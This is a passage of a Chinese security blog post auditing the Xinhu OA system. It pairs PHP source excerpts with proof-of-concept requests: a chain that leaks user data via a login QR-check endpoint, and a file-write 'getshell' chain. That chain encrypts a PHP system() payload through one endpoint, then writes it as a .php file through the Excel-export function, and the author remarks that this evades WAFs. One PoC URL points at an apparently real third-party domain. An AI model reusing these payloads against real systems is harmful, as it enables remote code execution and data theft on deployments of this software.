class="string">"`id`='$val' and `status`=1"</span>,<span class="string">'`name`,`user`,`face`,`pass`'</span>);</span><br><span class="line">		<span class="keyword">if</span>(!$urs)&#123;</span><br><span class="line">			$val = <span class="string">'-1'</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$data[<span class="string">'user'</span>] = $urs[<span class="string">'user'</span>];</span><br><span class="line">			$data[<span class="string">'face'</span>] = $dbs-&gt;getface($urs[<span class="string">'face'</span>]);</span><br><span class="line">			$data[<span class="string">'pass'</span>] = md5($urs[<span class="string">'pass'</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;option-&gt;delete(<span class="string">"`num`='$randkey'"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$data[<span class="string">'val'</span>] 	= $val;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;showreturn($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://localhost/xinhu/index.php?&amp;m=email&amp;a=setsave&amp;d=system&amp;ajaxbool=true" target="_blank" rel="noopener">http://localhost/xinhu/index.php?&amp;m=email&amp;a=setsave&amp;d=system&amp;ajaxbool=true</a></p>
<p>post:sendhost=1</p>
<p>后</p>
<p><a href="http://localhost/xinhu/api.php?&amp;m=login&amp;a=checkewm&amp;randkey=email_sendhost" target="_blank" rel="noopener">http://localhost/xinhu/api.php?&amp;m=login&amp;a=checkewm&amp;randkey=email_sendhost</a></p>
<h3 id="9-输出显示val"><a href="#9-输出显示val" class="headerlink" title="9.输出显示val"></a>9.输出显示val</h3><p>获取服务段加密数据</p>
<p>poc:</p>
<p><a href="http://www.realfoodco.cn/index.php?&amp;m=email&amp;a=publicstore&amp;d=system&amp;ajaxbool=true" target="_blank" rel="noopener">http://www.realfoodco.cn/index.php?&amp;m=email&amp;a=publicstore&amp;d=system&amp;ajaxbool=true</a></p>
<p>post:storeafteraction=savebeforecog&amp;emailpass=admin&amp;id=1</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">savebeforecog</span><span class="params">($table, $cans)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$emailpass	= <span class="keyword">$this</span>-&gt;post(<span class="string">'emailpass'</span>);</span><br><span class="line">	<span class="keyword">if</span>(!isempt($emailpass))&#123;</span><br><span class="line">		$cans[<span class="string">'emailpass'</span>] = <span class="keyword">$this</span>-&gt;jm-&gt;encrypt($emailpass);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'rows'</span> =&gt; $cans</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="写文件GETSHELL"><a href="#写文件GETSHELL" class="headerlink" title="写文件GETSHELL"></a>写文件GETSHELL</h3><p>这是一个很有意思的漏洞，由于该框架的实现相当灵活，这里我是利用了一些组合调用来完成的上面的7、8、9都是我为了这一步做的一些铺垫。这里姿势比较多我只介绍了一种，有幸看到文章的师傅也可以试一试</p>
<p>首先看问题所在的函数，C:\phpStudy\PHPTutorial\WWW\xinhu\webmain\webmainAction.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public function exceldown($arr)</span><br><span class="line">&#123;</span><br><span class="line">   $fields = explode(&apos;,&apos;, $this-&gt;post(&apos;excelfields&apos;,&apos;&apos;,1));</span><br><span class="line">   $header = explode(&apos;,&apos;, $this-&gt;post(&apos;excelheader&apos;,&apos;&apos;,1));</span><br><span class="line">   $title = $this-&gt;post(&apos;exceltitle&apos;,&apos;&apos;,1);</span><br><span class="line">   $rows  = $arr[&apos;rows&apos;];</span><br><span class="line">   $exceltype = $this-&gt;post(&apos;exceltype&apos;,&apos;xls&apos;); //保存文件类型</span><br><span class="line">   $headArr   = array();</span><br><span class="line">   for($i=0; $i&lt;count($fields); $i++)&#123;</span><br><span class="line">      $headArr[$fields[$i]] = $header[$i];</span><br><span class="line">   &#125;</span><br><span class="line">   $url      = c(&apos;html&apos;)-&gt;execltable($title, $headArr, $rows, $exceltype);</span><br><span class="line">   $this-&gt;returnjson(array(</span><br><span class="line">      &apos;url&apos;     =&gt; $url, </span><br><span class="line">      &apos;totalCount&apos;=&gt; $arr[&apos;totalCount&apos;],</span><br><span class="line">      &apos;downCount&apos; =&gt; count($rows)</span><br><span class="line">   ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里看到默认上传接受的文件后缀是xls，这个后缀传递给c(‘html’)-&gt;execltable模型，看看这个模型的实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">*  创建excel导出表格</span><br><span class="line">*/</span><br><span class="line">public function execltable($title, $headArr, $rows, $lx=&apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">   if($lx==&apos;&apos;)$lx=&apos;xls&apos;;</span><br><span class="line">   $borst  = &apos;.5pt&apos;;</span><br><span class="line">   $sty   = &apos;style=&quot;white-space:nowrap;border:&apos;.$borst.&apos; solid #000000;font-size:12px;&quot;&apos;;</span><br><span class="line">   $s        = &apos;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;&apos;.$title.&apos;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&apos;;</span><br><span class="line">   $s        .= &apos;&lt;table border=&quot;0&quot; style=&quot;border-collapse:collapse;&quot;&gt;&apos;;</span><br><span class="line">   $hlen  = 1;</span><br><span class="line">   $s1=&apos;&lt;tr height=&quot;30&quot;&gt;&lt;td &apos;.$sty.&apos;&gt;序号&lt;/td&gt;&apos;;</span><br><span class="line">   foreach($headArr as $na)&#123;</span><br><span class="line">      $hlen++;</span><br><span class="line">      $s1.=&apos;&lt;td &apos;.$sty.&apos;&gt;&apos;.$na.&apos;&lt;/td&gt;&apos;;</span><br><span class="line">   &#125;</span><br><span class="line">   $s1.=&apos;&lt;/tr&gt;&apos;;</span><br><span class="line">   $s.=&apos;&lt;tr height=&quot;40&quot;&gt;&lt;td &apos;.$sty.&apos; colspan=&quot;&apos;.$hlen.&apos;&quot;&gt;&apos;.$title.&apos;&lt;/td&gt;&lt;/tr&gt;&apos;;</span><br><span class="line">   $s.=$s1;</span><br><span class="line">   foreach($rows as $k=&gt;$rs)&#123;</span><br><span class="line">      $s.=&apos;&lt;tr height=&quot;26&quot;&gt;&apos;;</span><br><span class="line">      $s.=&apos;&lt;td align=&quot;center&quot; &apos;.$sty.&apos;&gt;&apos;.($k+1).&apos;&lt;/td&gt;&apos;;</span><br><span class="line">      foreach($headArr as $kf=&gt;$na)&#123;</span><br><span class="line">         $val = &apos;&apos;;</span><br><span class="line">         if(isset($rs[$kf]))$val=$rs[$kf];</span><br><span class="line">         $s.=&apos;&lt;td &apos;.$sty.&apos;&gt;&apos;.$val.&apos;&lt;/td&gt;&apos;;</span><br><span class="line">      &#125;</span><br><span class="line">      $s.=&apos;&lt;/tr&gt;&apos;;</span><br><span class="line">   &#125;</span><br><span class="line">   $s.=&apos;&lt;/table&gt;&apos;;</span><br><span class="line">   </span><br><span class="line">   $s.=&apos;&lt;/body&gt;&lt;/html&gt;&apos;;</span><br><span class="line">   </span><br><span class="line">   $mkdir     = &apos;&apos;.UPDIR.&apos;/logs/&apos;.date(&apos;Y-m&apos;).&apos;&apos;;</span><br><span class="line">   </span><br><span class="line">   if(!contain(strtolower(PHP_OS),&apos;win&apos;))&#123;</span><br><span class="line">      $title = c(&apos;pingyin&apos;)-&gt;get($title, 1);//linux要用拼音，不然会乱码</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   $filename  = &apos;&apos;.$title.&apos;_&apos;.date(&apos;d_His&apos;).&apos;.&apos;.$lx.&apos;&apos;;</span><br><span class="line">   $filename  = str_replace(&apos;/&apos;,&apos;&apos;,$filename);</span><br><span class="line">   $url      = &apos;&apos;.$mkdir.&apos;/&apos;.$filename.&apos;&apos;;</span><br><span class="line">   $bo       = $this-&gt;rock-&gt;createtxt(iconv(&apos;utf-8&apos;,&apos;gb2312&apos;,$url), $s);</span><br><span class="line">   return $url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>文件名自始至终没有一个检测，利用这里我们可以写入任意文件，但是有几点需要注意，首先需要写进文件的变量是\$title, \$headArr,\$arr,前两个是用户post后然后加密一次的变量，arr变量是调用该方法传入的一个数组参数。我这里考虑使用前者两个变量写shell，因为这样我的数据包是一次加密的这样比较隐蔽，但是这个加密函数是内部实现的，我该如何将我的字符串使用网站加密再返回给我？找到这么一个函数</p>
<p>C:\phpStudy\PHPTutorial\WWW\xinhu\webmain\system\email\emailAction.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function savebeforecog($table, $cans)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $emailpass = $this-&gt;post(&apos;emailpass&apos;);</span><br><span class="line">   if(!isempt($emailpass))&#123;</span><br><span class="line">      $cans[&apos;emailpass&apos;] = $this-&gt;jm-&gt;encrypt($emailpass);</span><br><span class="line">   &#125;</span><br><span class="line">   return array(</span><br><span class="line">      &apos;rows&apos; =&gt; $cans</span><br><span class="line">   );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>post(‘emailpass’)后返回回去，有了这个函数，还有漏洞，就差一把枪，也就是该如何调用。</p>
<p>由于这个框架直接路由调用的方法都是以Ajax或者Action结尾的方法，这两个方法都不能如此直接路由调用，这里就找到一些公共方法。首先是加密这一块，我调用publicstoreAjax()方法，其中会接受参数进行下一步的操作</p>
<p>访问</p>
<p><a href="http://localhost/xinhu/index.php?&amp;m=email&amp;a=publicstore&amp;d=system&amp;ajaxbool=true" target="_blank" rel="noopener">http://localhost/xinhu/index.php?&amp;m=email&amp;a=publicstore&amp;d=system&amp;ajaxbool=true</a></p>
<p>post数据:storeafteraction=savebeforecog&amp;emailpass=&lt;?php system(“ipconfig”)?&gt;&amp;id=1</p>
<p>这样生成加密字符串</p>
<p><img src="http://ww1.sinaimg.cn/large/7e2785d1ly1fow94ygkmkj212c0b43zl.jpg" alt=""> </p>
<p>拿到加密字符串后开始正式写shell</p>
<p>访问：<a href="http://localhost/xinhu/index.php?&amp;a=publicsavevalue&amp;ajaxbool=true" target="_blank" rel="noopener">http://localhost/xinhu/index.php?&amp;a=publicsavevalue&amp;ajaxbool=true</a></p>
<p>post数据:fieldsafteraction=exceldown&amp;exceltype=php&amp;excelheader=hx0oh0kt0nnl0lt0tv0ok0nxp0ll0kn0nxh0nvv0nxx0tn0ho0nno0tk0ot0tu0nnv0ll0tn0th0nnh0lh0nxl0lx0nnv0lx0nvn0tp0nnv0hx0nvv0kv0kh03</p>
<p>写文件</p>
<p><img src="http://ww1.sinaimg.cn/large/7e2785d1ly1fow96g1a45j21060bsgmn.jpg" alt=""> </p>
<p>生成成功，验证一下</p>
<p><img src="http://ww1.sinaimg.cn/large/7e2785d1ly1fow972gm1rj20l10nidh8.jpg" alt=""> </p>
<p>由于我写入的字符串post的时候就是加密一次的，所以这里自带过滤，可以过一些waf等防护</p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/leejgod">Projects</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#信呼OA"><span class="toc-number">1.</span> <span class="toc-text">信呼OA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-管理员登录验证绕过，可直接登录任意在线用户"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.管理员登录验证绕过，可直接登录任意在线用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-前台登录接口注入"><span class="toc-number">1.0.2.</span> <span class="toc-text">2.前台登录接口注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-自定义setval"><span class="toc-number">1.0.3.</span> <span class="toc-text">7.自定义setval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-输出显示val"><span class="toc-number">1.0.4.</span> <span class="toc-text">8.输出显示val</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-输出显示val"><span class="toc-number">1.0.5.</span> <span class="toc-text">9.输出显示val</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写文件GETSHELL"><span class="toc-number">1.0.6.</span> <span class="toc-text">写文件GETSHELL</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.leej.me/2018/03/07/某oa系统的审计/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&text=某oa系统的审计"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&title=某oa系统的审计"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&is_video=false&description=某oa系统的审计"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=某oa系统的审计&body=Check out this article: http://blog.leej.me/2018/03/07/某oa系统的审计/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&title=某oa系统的审计"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&title=某oa系统的审计"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&title=某oa系统的审计"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&title=某oa系统的审计"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&name=某oa系统的审计&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 Leej
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/leejgod">Projects</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-86660611-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Disqus Comments -->


